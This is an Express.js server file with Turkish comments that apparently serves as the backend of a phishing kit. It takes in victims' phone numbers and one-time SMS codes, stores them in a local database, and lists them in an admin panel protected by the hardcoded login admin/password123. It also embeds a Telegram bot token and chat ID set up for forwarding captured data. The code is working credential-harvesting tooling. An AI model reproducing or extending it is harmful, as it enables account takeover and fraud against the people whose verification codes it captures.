const express = require('express');
const basicAuth = require('express-basic-auth');
const path = require('path');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const ShortUniqueId = require('short-unique-id');
const axios = require('axios'); // Telegram için

const uid = new ShortUniqueId({ length: 8 });

// Veritabanı kurulumu
const adapter = new FileSync(path.join(__dirname, 'db.json'));
const db = low(adapter);
db.defaults({ submissions: [], visits: 0 }).write();

const app = express();

// --- DÜZELTME 1: Express'in kendi body-parser'ını kullan ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- DÜZELTME 2: Statik dosya yolunu kontrol et ---
// Eğer 'frontend' klasörü 'backend' klasörünün içindeyse, bu satır doğru:

 app.use(express.static(path.join(__dirname, '../frontend')));


// EJS view engine kurulumu (Panel için)
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Ziyaretçi sayacını tüm sayfa yüklemeleri için bir middleware olarak ekleyelim
app.use((req, res, next) => {
    // Sadece HTML sayfalarına gelen isteklerde sayacı artır
    if (req.url.endsWith('/') || req.url.endsWith('.html')) {
        db.update('visits', n => n + 1).write();
    }
    next(); // İsteğin devam etmesini sağla
});

// --- DÜZELTME 3: app.get('/') rotası kaldırıldı, çünkü express.static hallediyor ---

const token = '8191580694:AAG7EnTXoERSTuuuY381HK7ExtJyB2T8IxU'; // Bot token'ınız
const chatId = '-4728131788'; // Chat ID'niz
const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

// API Endpoints (Bunlar zaten doğru görünüyor)
app.post('/send-otp-request', (req, res) => {
    const { phoneNumber } = req.body;
    
    if(!phoneNumber){
        return res.status(400).json({ success: false, message: 'Telefon numarası eksik.' });
    }
    
    const newId = uid.rnd();
    db.get('submissions')
        .unshift({
            id: newId,
            phoneNumber: phoneNumber,
            status: 'pending_otp',
            createdAt: new Date().toISOString()
        })
        .write();
    res.json({ success: true, trans_id: newId });
});

app.post('/verify-otp', (req, res) => {
    const { trans_id, otpCode } = req.body;
    
    if(!trans_id || !otpCode){
         return res.status(400).json({ success: false, message: 'Eksik bilgi.' });
    }
    
    const submission = db.get('submissions').find({ id: trans_id });

    if (submission.value()) {
        submission.assign({
            otpCode: otpCode,
            status: 'verified',
            verifiedAt: new Date().toISOString()
        }).write();
        res.json({ success: true, message: 'Kod doğrulandı.' });
    } else {
        res.status(404).json({ success: false, message: 'İşlem bulunamadı.' });
    }
});

// Panel route
app.get('/panel',
    basicAuth({ users: { admin: 'password123' }, challenge: true }),
    (req, res) => {
        const submissions = db.get('submissions').value();
        const visits = db.get('visits').value();
        res.render('panel', { submissions, visits });
    }
);

// Logout
app.get('/logout', (req, res) => {
    res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
    res.status(401).send('Çıkış yapıldı');
});


const PORT = 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Sunucu başarıyla başlatıldı!`);
    console.log(`Tarayıcıdan erişmek için: http://localhost:${PORT}`);
});